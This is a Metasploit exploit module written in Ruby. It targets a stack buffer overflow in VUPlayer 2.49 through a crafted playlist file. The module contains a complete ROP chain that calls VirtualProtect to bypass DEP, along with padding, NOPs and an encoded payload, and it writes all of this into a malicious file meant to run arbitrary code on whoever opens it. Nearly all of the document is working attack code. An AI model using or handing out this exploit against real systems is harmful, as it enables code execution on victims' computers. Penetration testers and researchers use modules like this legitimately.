##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VUPlayer pls Buffer Overflow ROP Bypass',
      'Description'    => %q{
          This module exploits a stack over flow in VUPlayer <= 2.49. When
          the application is used to open a specially crafted pls file, an buffer is overwritten allowing
          for the execution of arbitrary code.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Nipun Jaswal' ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'    => 750,
          'BadChars' => "\x00\x0a\x1a\x20\x40",
          #'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
          #'DisableNops'  =>  'True',
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'VUPlayer 2.49', { 'Ret' => 0x1010539f } ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Aug 18 2009',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.m3u']),
      ])
  end

 def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      0x0047044d,  # POP EBP # RETN [VUPlayer.exe] 
      0x0043373b,  # & jmp esp [VUPlayer.exe]
      0x004eefb7,  # POP EBX # RETN [VUPlayer.exe] 
      0x00000201,  # 0x00000201-> ebx
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00000040,  # 0x00000040-> edx
      0x004ca190,  # POP ECX # RETN [VUPlayer.exe] 
      0x10040c88,  # &Writable location [BASS.dll]
      0x004d9f0c,  # POP EDI # RETN [VUPlayer.exe] 
      0x1003a084,  # RETN (ROP NOP) [BASS.dll]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      0x004c4f94,  # PUSHAD # RETN [VUPlayer.exe] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


def exploit
	#Malicious File Creation
	rop = create_rop_chain()
    	pls = rand_text_alpha_upper(1012)
    	pls << rop
    	pls << make_nops(8)
    	pls << payload.encoded
    	print_status("Creating '#{datastore['FILENAME']}' file ...")
    	file_create(pls)
end

end
